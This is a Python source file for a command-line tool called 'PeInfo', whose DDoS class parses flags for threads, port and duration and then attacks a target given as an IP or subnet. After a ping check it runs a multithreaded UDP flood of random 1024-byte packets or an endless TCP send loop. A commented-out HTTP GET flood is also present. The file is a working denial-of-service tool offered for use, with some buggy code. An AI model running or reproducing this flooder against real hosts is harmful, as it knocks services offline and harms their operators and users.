import subprocess
import datetime
import sys
import time
import threading
import socket
import random
import threading
import requests
import os
import signal
import psutil
from colorama import Fore
from src.help import Help

# ./pinfo -d -uD -t 10000 -p 80 -s 120 192.168.0.0/16

class DDoS:
    def __init__(self, target: str):
      self.target = target
      self.argument_handlers()

    def argument_handlers(self):
      thread = 10
      port = 80
      second = 5
      now = datetime.datetime.now()
      formatted_time = now.strftime("%Y-%m-%d %H:%M:%S")
      print("Starting PeInfo v1.0 ( https://nextjiesdev.site ) at", formatted_time)
      for i in sys.argv[2:]:
         if i == "-uD":
            if len(sys.argv) > 2:
               if "-t" in sys.argv[3:]:
                  for k in sys.argv[4:5]:
                     thread = k
               if "-p" in sys.argv[3:]:
                  for k in sys.argv[6:7]:
                     port = k
               if "-s" in sys.argv[3:]:
                  for k in sys.argv[8:9]:
                     second = k

               self.target = sys.argv[-1]
               print("PeInfo attacking DDoS with UDP method with target", self.target, "with thread", thread, "and port", port, f"for {second}s")
               if self.ping_host(self.target):
                  self.udp_ddos_attack(target_ip=self.target, target_port=int(port), num_threads=int(thread))
                  # self.countdown_timer(seconds=int(second), port=int(port), thread=thread)
               break
            else:
               Help.exampleUsage()
               break
         elif i == "-tC":
            if len(sys.argv) > 2:
               if "-t" in sys.argv[3:]:
                  for k in sys.argv[4:5]:
                     thread = k
               if "-p" in sys.argv[3:]:
                  for k in sys.argv[6:7]:
                     port = k
               if "-s" in sys.argv[3:]:
                  for k in sys.argv[8:9]:
                     second = k

               self.target = sys.argv[-1]
               print(Fore.RED, "PeInfo attacking DDoS with TCP method with target", self.target, "with thread", thread, "and port", port)
               if self.ping_host(self.target):
                  self.tcp_ddos_attack(target_ip=self.target, target_port=int(port))
                  # self.start_tcp_flood(threads_count=int(thread))
                  # self.countdown_timer(seconds=int(second), port=port, thread=thread)
               break
            else:
               Help.exampleUsage()
            break
         elif i is not "-uD" or i is not "-tC":
            Help.exampleUsage()
            break
         else:
            Help.exampleUsage()
            break

    def tcp_ddos_attack(self, target_ip, target_port):
      # create a socket object
      client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

      server_ip = "127.0.0.1"  # replace with the server's IP address
      server_port = 8000  # replace with the server's port number
      # establish connection with server
      client.connect((target_ip, target_port))

      while True:
         # input message and send it to the server
         msg = "Hello World Umsida"
         client.send(msg.encode("utf-8")[:1024])

         # receive message from the server
         response = client.recv(1024)
         response = response.decode("utf-8")

         # if server sent us "closed" in the payload, we break out of the loop and close our socket
         if response.lower() == "closed":
               break

         print(f"Received: {response}")

      # close client socket (connection to the server)
      client.close()
      print("Connection to server closed")
          

    def udp_ddos_attack(self, target_ip, target_port, num_threads):
      """
      Simulates a UDP-based DDoS attack on a given IP and port.
      
      Parameters:
      target_ip (str): Target IP address.
      target_port (int): Target port number.
      num_threads (int): Number of threads to simulate the attack.
      """
      def attack():
         try:
            # Create a UDP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Generate a random payload
            payload = random._urandom(1024)  # 1024-byte payload
            while True:
               # Send the payload repeatedly to the target
               s.sendto(payload, (target_ip, target_port))
               print(f"Packet sent to {target_ip}:{target_port}")
         except OSError as exc:
            if exc.errno == 55:
               time.sleep(0.1)
            else:
               raise

      # Start threads to simulate concurrent attack
      for i in range(num_threads):
         thread = threading.Thread(target=attack)
         thread.start()
         print(f"Thread-{i+1} started.")


    
   #  def tcp_method(self):
   #     i = 0
   #     headers = {
   #        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
   #     }
   #     try:
   #        while True:
   #          # response = requests.get("103.139.25.68", headers=headers)
   #          response = requests.get(f"https://{self.target}", headers=headers)
   #          i += 1
   #          print(f"{i}. Packet sent with status code: {response.status_code}")
   #     except Exception as e:
   #        print(f"Error: {e}")


    def start_tcp_flood(self, threads_count):
      threads = []
      for i in range(threads_count):
         thread = threading.Thread(target=self.tcp_method())
         threads.append(thread)
         thread.start()

      for thread in threads:
         thread.join()

    def ping_host(self, host):
      try:
         result = subprocess.run(
            ["ping", "-c", "3", host] if not subprocess.os.name == "nt" else ["ping", "-n", "4", host],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
         )
         if result.returncode == 0:
            print(Fore.BLUE, f"Ping to {host} was successful:\n{result.stdout}")
            return True
         else:
            print(f"Ping to {host} failed:\n{result.stderr}")
            return False
      except Exception as e:
         print(f"An error occurred: {e}")
         return False
      
    def countdown_timer(self, seconds, port, thread):
      try:
         while seconds:
            mins, secs = divmod(seconds, 60)
            timer = f'{mins:02}:{secs:02}'
            print("Time left attacking for", timer, end='\r')
            time.sleep(1)
            seconds -= 1
         if seconds is 0:
            print()
            print(Fore.GREEN, "Attacking complete!")
            sys.exit()
      except Exception as e:
         print(f"Error: {e}")


    def stop_python_process(self, target_script_name):
      try:
         # Iterate over all running processes
         for proc in psutil.process_iter(attrs=['pid', 'name', 'cmdline']):
            try:
               # Check if the process name or command-line matches the target script
               if target_script_name in proc.info['cmdline']:
                  print(f"Stopping process {proc.info['name']} with PID {proc.info['pid']}...")
                  os.kill(proc.info['pid'], signal.SIGTERM)
                  print("Process terminated successfully.")
                  return
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
               continue
         print(f"No process found running the script '{target_script_name}'.")
      except Exception as e:
         print(f"An error occurred: {e}")